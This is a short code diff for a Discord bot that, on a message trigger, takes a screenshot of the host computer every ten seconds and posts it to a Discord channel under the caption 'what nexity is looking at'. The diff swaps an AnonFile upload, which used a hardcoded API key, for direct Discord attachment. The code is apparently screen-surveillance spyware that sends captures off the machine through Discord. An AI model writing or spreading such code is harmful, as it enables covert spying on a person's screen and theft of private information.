@@ -11,9 +11,10 @@ async def on_message(message):
         while True:
             screenshot = pyautogui.screenshot()
             screenshot.save("screen.png")
-            anon = AnonFile('351fafd5bb43939b')
-            status, file_url = anon.upload_file('screen.png')
-            await message.channel.send("what nexity is looking at: " + file_url)
+            #anon = AnonFile('351fafd5bb43939b')
+            #status, file_url = anon.upload_file('screen.png')
+            await message.channel.send("what nexity is looking at: ")
+            await message.channel.send(file=discord.File('screen.png'))
             time.sleep(10)
     
 client.run(TOKEN)
